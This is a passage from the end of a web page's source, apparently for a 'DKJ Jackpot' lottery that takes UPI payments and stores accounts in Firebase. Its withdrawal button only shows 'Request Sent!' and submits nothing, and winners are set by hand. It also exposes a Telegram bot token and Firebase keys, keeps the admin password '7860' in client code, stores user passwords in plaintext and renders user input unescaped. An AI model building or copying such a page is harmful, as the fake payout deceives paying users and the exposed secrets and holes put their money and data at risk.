        .pg-container { background: #ddd; height: 12px; border-radius: 10px; margin: 10px 0; overflow: hidden; }
        .pg-bar { background: var(--gold); height: 100%; width: 0%; transition: 0.5s; }

        #popup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 1000; color: white; padding: 20px; box-sizing: border-box; text-align: center; overflow-y: auto; }
        input { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; font-weight: bold; color: #000; outline: none; box-sizing: border-box; }
        .list-item { background: #222; padding: 12px; border-radius: 8px; margin-bottom: 8px; text-align: left; border-left: 4px solid var(--gold); cursor: pointer; }
        .win-amt { float: right; color: #27ae60; font-weight: bold; }
        #congrats { display:none; color: gold; font-size: 20px; font-weight: bold; animation: blink 1s infinite; margin-top:10px; text-align:center; }
        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0.2;} 100% {opacity: 1;} }

</div>

<script>
    // Firebase Configuration
    const firebaseConfig = {
        apiKey: "AIzaSyBcdlUy_CAFZbQPPzOzGTkofvvSSdXe6r4",
        authDomain: "dkj-jackpot.firebaseapp.com",
        databaseURL: "https://dkj-jackpot-default-rtdb.firebaseio.com",
        projectId: "dkj-jackpot",
        storageBucket: "dkj-jackpot.firebasestorage.app",
        messagingSenderId: "598164039811",
        appId: "1:598164039811:web:27420c0d7ecedf28fb53b6"
    };

    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    const TG_BOT_TOKEN = "8357735991:AAHUnhnXj0MaNi-Z1XtitwMy994xssKRsyg";
    const TG_ADMIN_ID = "8072402346"; 
    const UPI_ID = "paytmqr6vnhle@ptys";

    let currentUser = JSON.parse(localStorage.getItem('dkj_user_login'));

    // Real-time Sync
    function syncData() {
        database.ref('/').on('value', (snapshot) => {
            const data = snapshot.val() || {};
            updateUI(data);
        });
    }

    function updateUI(data) {
        const users = data.users || {};
        if(currentUser) {
            const myData = users[currentUser.mob];
            if(myData) {
                currentUser = myData;
                document.getElementById('uHi').innerText = "Hi, " + myData.name;
                document.getElementById('vBal').innerText = "‚Çπ" + (myData.bal || 0);
                document.getElementById('rBtn').style.display = 'none';
                document.getElementById('congrats').style.display = myData.isWinner ? "block" : "none";
            }
        }
        let userCount = Object.keys(users).length;
        let percent = Math.min((userCount / 1000) * 100, 100);
        document.getElementById('pBar').style.width = percent + "%";
        document.getElementById('pgTxt').innerText = Math.floor(percent) + "%";
    }

    function showReg() {
        document.getElementById('pContent').innerHTML = `<h2>REGISTER</h2><input id="rn" placeholder="Full Name"><input id="rm" type="number" placeholder="Mobile Number"><input id="rp" type="password" placeholder="Set Password"><button class="btn btn-gold" onclick="doReg()">CREATE ACCOUNT</button>`;
        document.getElementById('popup').style.display = 'block';
    }

    function doReg() {
        let n = document.getElementById('rn').value, m = document.getElementById('rm').value, p = document.getElementById('rp').value;
        if(!n || !m || !p) return alert("Sari details bharein!");
        let userData = { name: n, mob: m, pass: p, bal: 0, codes: ["No Tickets"], isWinner: false };
        database.ref('users/' + m).set(userData);
        currentUser = userData;
        localStorage.setItem('dkj_user_login', JSON.stringify(userData));
        alert("Account Created Successfully!"); closeP();
    }

    function join(amt) {
        if(!currentUser) return alert("Pehle Account Banayein!");
        document.getElementById('pContent').innerHTML = `<h2>PAYMENT ‚Çπ${amt}</h2><p>Scan QR & Pay. Admin verify karke code dega.</p><img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=upi://pay?pa=${UPI_ID}%26am=${amt}"><button class="btn btn-gold" onclick="requestPay()">I HAVE PAID</button>`;
        document.getElementById('popup').style.display = 'block';
    }

    function requestPay() {
        database.ref('pending/' + currentUser.mob).set({ name: currentUser.name, mob: currentUser.mob });
        alert("Admin ko request bhej di gayi hai!"); closeP();
    }

    function showWinners() {
        database.ref('winners').once('value', (snap) => {
            let h = "<h2>üèÜ TOP WINNERS</h2>";
            let list = []; snap.forEach(c => { list.push(c.val()); });
            list.reverse().forEach(w => {
                h += `<div class="list-item"><span class="win-amt">‚Çπ${w.prize}</span><b>${w.name}</b><br><small>Ticket: ${w.code}</small></div>`;
            });
            document.getElementById('pContent').innerHTML = h || "No Winners Yet!";
            document.getElementById('popup').style.display = 'block';
        });
    }

    function showProfile() {
        if(!currentUser) return alert("Login Karo!");
        let ticketList = Array.isArray(currentUser.codes) ? currentUser.codes.filter(c => c !== "No Tickets").join(", ") : "Waiting for Admin";
        document.getElementById('pContent').innerHTML = `<h2>MY PROFILE</h2><p><b>Name:</b> ${currentUser.name}</p><p><b>Mobile:</b> ${currentUser.mob}</p><p><b>My Codes:</b> ${ticketList || "None"}</p><button class="btn btn-dark" onclick="logout()">LOGOUT</button>`;
        document.getElementById('popup').style.display = 'block';
    }

    function showWithdrawForm() {
        if(!currentUser || currentUser.bal <= 0) return alert("Paisa nahi hai!");
        document.getElementById('pContent').innerHTML = `<h2>WITHDRAW</h2><input id="w_bank" placeholder="Bank/UPI Details"><button class="btn btn-gold" onclick="alert('Request Sent!')">SUBMIT</button>`;
        document.getElementById('popup').style.display = 'block';
    }

    function adminMode() {
        let pw = prompt("Admin PW:"); if(pw !== "7860") return;
        let act = prompt("1: Pending Approvals\n2: Pick Winner");
        if(act=="1") {
            database.ref('pending').once('value', (snap) => {
                let h = "<h2>Approve Payments</h2>";
                snap.forEach(c => {
                    let u = c.val();
                    let code = "DKJ-"+Math.floor(100000+Math.random()*900000);
                    h += `<div class="list-item" onclick="approveUser('${u.mob}','${code}')"><b>User:</b> ${u.name}<br>Click to Approve: ${code}</div>`;
                });
                document.getElementById('pContent').innerHTML = h || "No Pending";
                document.getElementById('popup').style.display = 'block';
            });
        } else if(act=="2") {
            let mob = prompt("Winner Mobile Number:");
            let prz = prompt("Prize Amount:");
            let cod = prompt("Winner Ticket Code:");
            database.ref('users/' + mob).once('value', (s) => {
                let u = s.val();
                if(u) {
                    database.ref('winners').push({ name: u.name, prize: prz, code: cod });
                    database.ref('users/' + mob).update({ bal: (u.bal || 0) + parseInt(prz), isWinner: true });
                    alert("Winner Updated!");
                }
            });
        }
    }

    function approveUser(mob, code) {
        database.ref('users/' + mob + '/codes').push(code);
        database.ref('pending/' + mob).remove();
        alert("Approved!"); closeP();
    }

    function logout() { localStorage.removeItem('dkj_user_login'); location.reload(); }
    function closeP() { document.getElementById('popup').style.display = 'none'; }
    window.onload = syncData;
</script>
